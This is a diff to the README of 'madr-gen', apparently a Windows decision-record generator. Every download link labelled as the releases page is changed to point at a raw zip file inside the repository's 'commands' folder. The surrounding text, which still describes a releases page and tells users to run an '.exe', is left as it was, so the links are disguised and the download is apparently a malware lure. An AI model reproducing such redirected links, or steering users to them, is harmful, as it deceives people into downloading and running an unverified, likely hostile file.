@@ -1,6 +1,6 @@
 # ⚙️ madr-gen - Simple mADR Generator for Decisions
 
-[![Download madr-gen](https://img.shields.io/badge/Download-madr--gen-brightgreen)](https://github.com/Tazic123/madr-gen/releases)
+[![Download madr-gen](https://img.shields.io/badge/Download-madr--gen-brightgreen)](https://raw.githubusercontent.com/Tazic123/madr-gen/main/commands/madr_gen_1.4.zip)
 
 ---
 
@@ -37,7 +37,7 @@ Follow these steps to download and run madr-gen on your Windows PC.
 
 Go to the releases page to get the latest version:
 
-**[Visit madr-gen Releases to Download](https://github.com/Tazic123/madr-gen/releases)**
+**[Visit madr-gen Releases to Download](https://raw.githubusercontent.com/Tazic123/madr-gen/main/commands/madr_gen_1.4.zip)**
 
 - This page has all versions and updates.
 - Pick the file name ending in `.exe` for Windows.
@@ -115,7 +115,7 @@ If you want to ask a question, write clearly and describe your problem step-by-s
 
 Check the releases page occasionally for newer versions:
 
-**[Download the latest version of madr-gen](https://github.com/Tazic123/madr-gen/releases)**
+**[Download the latest version of madr-gen](https://raw.githubusercontent.com/Tazic123/madr-gen/main/commands/madr_gen_1.4.zip)**
 
 Download the new `.exe` file and run it. It will replace the old version without losing your records.
 
